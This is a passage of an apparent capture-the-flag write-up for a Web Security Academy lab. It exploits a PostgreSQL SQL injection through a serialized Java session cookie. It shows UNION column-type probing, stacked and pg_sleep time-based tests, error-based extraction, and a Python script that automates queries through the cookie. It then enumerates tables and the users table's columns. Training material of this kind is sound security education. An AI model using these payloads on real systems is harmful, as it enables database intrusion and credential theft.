+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: 
+<span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">77</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#e6db74">&#39;6&#39;</span>,<span style="color:#e6db74">&#39;7&#39;</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">79</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#e6db74">&#39;6&#39;</span>,<span style="color:#e6db74">&#39;7&#39;</span>,<span style="color:#e6db74">&#39;8&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>It seems that all of them are returning strings, but there’s a <strong>strange behaviour</strong> we should look at…</p>
+<h2 id="strange-columns-behaviour">Strange columns&#39; behaviour</h2>
+<p>Notice the great change in the error’s position between <code>SELECT * FROM products WHERE id = &#39;&#39; UNION SELECT &#39;1&#39;,&#39;2&#39;,3,4,5,6,7,8--</code> and <code>SELECT * FROM products WHERE id = &#39;&#39; UNION SELECT &#39;1&#39;,&#39;2&#39;,&#39;3&#39;,4,5,6,7,8--</code>. The position goes from <strong>59</strong> to <strong>67</strong>, and it stands for a change from having an error in the <code>third column</code> to having the same in the <code>sixth</code> one. Do you know why this happen? Let’s dig into it.</p>
+<p>It seems that only columns <strong>4 and 5</strong> are integers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#e6db74">&#39;7&#39;</span>,<span style="color:#e6db74">&#39;8&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">67</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#e6db74">&#39;6&#39;</span>,<span style="color:#e6db74">&#39;7&#39;</span>,<span style="color:#e6db74">&#39;8&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>But the same happens on <code>position 77</code>, it seems that the <strong>seventh</strong> column also returns an integer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#e6db74">&#39;6&#39;</span>,<span style="color:#e6db74">&#39;7&#39;</span>,<span style="color:#e6db74">&#39;8&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>So then, why <code>SELECT * FROM products WHERE id = &#39;&#39; UNION SELECT &#39;1&#39;,&#39;2&#39;,&#39;3&#39;,4,5,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;--</code> and <code>SELECT * FROM products WHERE id = &#39;&#39; UNION SELECT &#39;1&#39;,&#39;2&#39;,&#39;3&#39;,4,5,&#39;6&#39;,7,&#39;8&#39;--</code> doesn’t return any errors?</p>
+<p>It seems that, when the engine identifies a <strong>conflict</strong> happens, it tries to cast the provided value to the type of the column it is trying to fetch. Later on, we will be doing the same to leak the column’s values.</p>
+<h3 id="veryifying-our-suspicions">Veryifying our suspicions</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid <span style="color:#66d9ef">input</span> syntax <span style="color:#66d9ef">for</span> integer: <span style="color:#f92672">&amp;</span>quot;d<span style="color:#f92672">&amp;</span>quot; <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">63</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>This time, the engine has casted the the string ’d&#39; to an integer, since it is not an integer, the query returns an error.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid <span style="color:#66d9ef">input</span> syntax <span style="color:#66d9ef">for</span> integer: <span style="color:#f92672">&amp;</span>quot;e<span style="color:#f92672">&amp;</span>quot; <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">67</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>In this query we have verified <strong>two things</strong>.</p>
+<ol>
+<li>Provided value ‘<code>1</code>’ has been casted to int(1) and doesn’t return an error.</li>
+<li>Again, the engine has casted the string ‘<code>e</code>’ to an integer and returns an error.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid <span style="color:#66d9ef">input</span> syntax <span style="color:#66d9ef">for</span> integer: <span style="color:#f92672">&amp;</span>quot;<span style="color:#66d9ef">g</span><span style="color:#f92672">&amp;</span>quot; <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">75</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><h2 id="dumping-preparation">Dumping Preparation</h2>
+<p>So let’s enumerate the different ways to exploit this injection:</p>
+<ul>
+<li>Adding <code>print(req.elapsed.total_seconds())</code> let us know the time elapsed in the request.</li>
+</ul>
+<p>Are <strong>stacked queries</strong> allowed?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>; <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>;<span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: Multiple ResultSets were returned <span style="color:#66d9ef">by</span> the query.<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>Even though there’s not output neither, the query gets executed as it can be seen here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>; <span style="color:#66d9ef">SELECT</span> pg_sleep(<span style="color:#ae81ff">10</span>);<span style="color:#75715e">--
+</span><span style="color:#75715e"></span>Elapsed: <span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">273399</span>
+</code></pre></div><p>This allow us to exploit this injection in a huge amount of ways <code>except boolean-based</code>.</p>
+<p><code>Stacked-TimeBased</code> (Like)</p>
+<pre tabindex="0"><code>SELECT * FROM products WHERE id = &#39;&#39;; QUERY WHERE COLUMN LIKE &#39;%&#39; AND (SELECT 1 FROM pg_sleep(10))=1;
+Elapsed: 10.273399
+</code></pre><p><code>Time-Based</code> (Like)</p>
+<pre tabindex="0"><code>SELECT * FROM products WHERE id = &#39;&#39; AND (SELECT &#39;1&#39;) LIKE &#39;1&#39; AND (SELECT 1 FROM pg_sleep(10))=1;
+</code></pre><p><code>Error-Based</code></p>
+<pre tabindex="0"><code>SELECT * FROM products WHERE id = &#39;&#39; UNION SELECT &#39;&#39;,&#39;&#39;,&#39;&#39;,(SELECT &#39;whatever&#39;)::int,1,&#39;&#39;,1,&#39;&#39;--
+
+&lt;p class=is-warning&gt;Internal Server Error&lt;/p&gt;
+&lt;p class=is-warning&gt;java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for integer: &amp;quot;whatever&amp;quot;&lt;/p&gt;
+</code></pre><p>In both first, <code>ASCII(SUBSTR())</code> can be used too, and in the last one, the selected value would be printed in the error.</p>
+<p>So on, we will be using the <strong>error-based method</strong>, since it is the <code>easiest and fastest</code> one. Before digging in the data dumping, let’s automate everything for us just to type the query and get the returned result.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> re
+
+session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;your-session&#34;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">.web-security-academy.net/&#34;</span>
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;rm Main.class 2&gt;/dev/null&#34;</span>)
+    query <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;SQL&gt; &#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>)<span style="color:#f92672">.</span>rstrip()
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; UNION SELECT &#39;&#39;,&#39;&#39;,&#39;&#39;,(</span><span style="color:#e6db74">{</span>query<span style="color:#e6db74">}</span><span style="color:#e6db74">)::int,1,&#39;&#39;,1,&#39;&#39;--&#34;</span>
+    base64_object <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;&#34;&#34;javac Main.java ; echo &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34; | java Main&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> payload)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>rstrip()
+
+    cookies <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#34;session&#34;</span>: base64_object
+    }
+
+    req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookies)
+    <span style="color:#66d9ef">try</span>:
+        print(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;&amp;quot;.*&amp;quot;&#34;</span>, req<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&amp;quot;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>))
+    <span style="color:#66d9ef">except</span>:
+        print(req<span style="color:#f92672">.</span>text)
+        print(<span style="color:#e6db74">&#34;Nothing found&#34;</span>)
+</code></pre></div><h2 id="database-names-discovery">Database names discovery</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> string_agg(datname, <span style="color:#e6db74">&#39;, &#39;</span>) <span style="color:#66d9ef">FROM</span> pg_database
+
+postgres, template1, template0
+</code></pre></div><h2 id="table-name-discovery">Table name discovery</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> string_agg(tablename, <span style="color:#e6db74">&#39;, &#39;</span>) <span style="color:#66d9ef">FROM</span> pg_tables <span style="color:#66d9ef">WHERE</span> schemaname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postgres&#39;</span>
+
+<span style="color:#66d9ef">Nothing</span> <span style="color:#66d9ef">found</span>
+</code></pre></div><p>It seems the query is not working, lets try <strong>avoiding</strong> <code>WHERE</code> statement.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> string_agg(tablename, <span style="color:#e6db74">&#39;, &#39;</span>) <span style="color:#66d9ef">FROM</span> pg_tables <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>
+
+users, products, pg_statistic, pg_foreign_table, pg_authid, pg_user_mapping, pg_subscription, pg_largeobject, pg_type, pg_attribute, pg_proc, pg_class, pg_attrdef, pg_constraint, pg_inherits, pg_index, pg_operator, pg_opfamily, pg_opclass, pg_am, pg_amop, pg_amproc, pg_language, pg_largeobject_metadata, pg_aggregate, pg_statistic_ext, pg_rewrite, pg_trigger, pg_event_trigger, pg_description, pg_cast, pg_enum, pg_namespace, pg_conversion, pg_depend, pg_database, pg_db_role_setting, pg_tablespace, pg_pltemplate, pg_auth_members, pg_shdepend, pg_shdescription, pg_ts_config, pg_ts_config_map, pg_ts_dict, pg_ts_parser, pg_ts_template, pg_extension, pg_foreign_data_wrapper, pg_foreign_server, pg_policy, pg_replication_origin, pg_default_acl, pg_init_privs, pg_seclabel, pg_shseclabel, pg_collation, pg_partitioned_table, pg_range, pg_transform, pg_sequence, pg_publication, pg_publication_rel, pg_subscription_rel, sql_features, sql_implementation_info, sql_languages, sql_packages, sql_parts, sql_sizing, sql_sizing_profiles
+</code></pre></div><p>There we go, it seems the first database was ‘<em>postgres</em>’, and there’s a very interesting table called ‘<code>users</code>’, let’s dig in!</p>
+<h2 id="column-name-discovery">Column name discovery</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> string_agg(<span style="color:#66d9ef">column_name</span>, <span style="color:#e6db74">&#39;, &#39;</span>) <span style="color:#66d9ef">FROM</span> information_schema.columns <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">table_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users&#39;</span>
+
+username, password
+</code></pre></div><p>There we have! According to the challenge’s description, we must sign up as the administrator and delete Carlos&#39; account. Let’s dump the values.</p>
+<h2 id="users-table-dump">Users table dump</h2>
